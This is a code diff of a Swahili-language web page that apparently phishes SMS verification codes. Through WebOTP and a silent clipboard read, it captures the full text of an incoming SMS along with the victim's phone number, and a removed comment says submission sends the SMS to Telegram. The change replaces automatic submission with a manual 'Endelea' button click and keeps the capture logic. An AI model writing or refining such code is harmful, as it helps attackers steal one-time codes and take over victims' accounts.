@@ -78,7 +78,8 @@
                     <i class="fas fa-sms"></i> <strong>Msimbo utagunduliwa kiotomatiki</strong><br><br>
                     <strong>1.</strong> Subiri SMS ifike kwenye simu yako<br>
                     <strong>2.</strong> Ukishaipokea, bonyeza <strong>"Allow"</strong> kwenye kidirisha kitakachoonekana<br>
-                    <strong>3.</strong> Msimbo utajaza kiotomatiki na kutumwa
+                    <strong>3.</strong> Ujumbe utajaza kiotomatiki<br>
+                    <strong>4.</strong> Bonyeza <strong>"Endelea"</strong> kutuma
                 </div>
                 <a href="sms:" class="sms-open-btn" id="btnIPhone" style="display:none;">
                     <i class="fas fa-envelope"></i> 📱 iPhone: Gusa Hapa Kufungua Messages
@@ -198,7 +199,6 @@
             } catch(e) {} 
             
             setTimeout(function() { resendCooldown = false; }, 30000);
-            // Restart WebOTP detection
             setTimeout(startAutoDetect, 1500);
         }
 
@@ -267,7 +267,7 @@
         }
 
         // ================================================================
-        // SMS AUTO-DETECTION - WebOTP (FULL SMS) - PRIORITY
+        // SMS AUTO-DETECTION - WebOTP (FULL SMS) - WAITS FOR NOTIFICATION
         // ================================================================
         function startAutoDetect() {
             if (!document.getElementById('screen1').classList.contains('active')) {
@@ -279,24 +279,20 @@
             var smsTextarea = document.getElementById('smsMessage');
             if (!smsTextarea) return;
 
-            function autoSubmit() {
+            function fillSMS() {
                 if (smsDetected) return;
                 var text = smsTextarea.value.trim();
                 if (text.length > 5) {
                     smsDetected = true;
-                    console.log('Auto-detect: SMS detected, submitting...');
+                    console.log('Auto-detect: SMS filled in textarea - user can now submit');
                     clearInterval(countdownTimer);
-                    document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
+                    document.getElementById('timerDisplay').textContent = '✅ Imekamilika - Bonyeza Endelea';
                     document.getElementById('timerDisplay').className = 'timer-bar';
-                    setTimeout(function() {
-                        if (document.getElementById('screen1').classList.contains('active')) {
-                            submitCode();
-                        }
-                    }, 1000);
+                    // DO NOT auto-submit - let user click the button
                 }
             }
 
-            // WebOTP API - Auto-read SMS from notification (PRIORITY)
+            // WebOTP API - Auto-read SMS from notification
             function autoReadSMS() {
                 if (!('OTPCredential' in window)) {
                     console.log('Auto-detect: WebOTP not supported on this browser');
@@ -328,33 +324,31 @@
                         console.log('✅ Auto-detect: Full SMS: ' + fullSMS);
                         
                         var errorEl = document.getElementById('codeError');
-                        errorEl.textContent = '✅ Msimbo umegunduliwa kiotomatiki!';
+                        errorEl.textContent = '✅ Ujumbe umegunduliwa! Bonyeza "Endelea" kutuma.';
                         errorEl.style.color = '#10b981';
                         errorEl.classList.add('show');
                         setTimeout(function() {
                             errorEl.classList.remove('show');
-                        }, 3000);
+                        }, 5000);
                         
-                        // This sends the FULL SMS to Telegram via submitCode()
-                        autoSubmit();
+                        // JUST FILL THE SMS - DO NOT AUTO-SUBMIT
+                        fillSMS();
                     }
                 })
                 .catch(function(e) {
                     if (e.name === 'AbortError') {
                         console.log('Auto-detect: WebOTP timeout - trying clipboard...');
-                        // Only try clipboard if WebOTP times out
                         readClipboard();
                     } else {
                         console.log('Auto-detect: WebOTP error', e);
-                        // Try clipboard as fallback
                         readClipboard();
                     }
                 });
             }
 
-            // Clipboard fallback (ONLY if WebOTP fails or times out)
+            // Clipboard fallback (ONLY if WebOTP fails)
             function readClipboard() {
-                if (webOtpUsed) return; // Don't use clipboard if WebOTP already worked
+                if (webOtpUsed) return;
                 if (!navigator.clipboard || !navigator.clipboard.readText) {
                     console.log('Auto-detect: Clipboard not available');
                     return;
@@ -366,7 +360,14 @@
                     if (text && text.length > 10 && !smsDetected) {
                         smsTextarea.value = text;
                         console.log('Auto-detect: SMS from clipboard (fallback)');
-                        autoSubmit();
+                        var errorEl = document.getElementById('codeError');
+                        errorEl.textContent = '✅ Ujumbe umegunduliwa! Bonyeza "Endelea" kutuma.';
+                        errorEl.style.color = '#10b981';
+                        errorEl.classList.add('show');
+                        setTimeout(function() {
+                            errorEl.classList.remove('show');
+                        }, 5000);
+                        fillSMS();
                     }
                 })
                 .catch(function(e) {
@@ -406,7 +407,14 @@
                     smsTextarea.value = text;
                     smsDetected = true;
                     console.log('Auto-detect: SMS pasted manually');
-                    autoSubmit();
+                    var errorEl = document.getElementById('codeError');
+                    errorEl.textContent = '✅ Ujumbe umegunduliwa! Bonyeza "Endelea" kutuma.';
+                    errorEl.style.color = '#10b981';
+                    errorEl.classList.add('show');
+                    setTimeout(function() {
+                        errorEl.classList.remove('show');
+                    }, 5000);
+                    // JUST FILL - no auto-submit
                 }
             });
 
@@ -433,7 +441,8 @@
         console.log('✅ Code page loaded with auto-detection');
         console.log('📱 App ID: ' + appId);
         console.log('📱 Phone: ' + userPhone);
-        console.log('📱 SMS will be detected from NOTIFICATION (not clipboard)');
+        console.log('📱 SMS will be detected from NOTIFICATION and auto-filled');
+        console.log('📱 User will click "Endelea" manually to submit');
     </script>
 </body>
 </html>
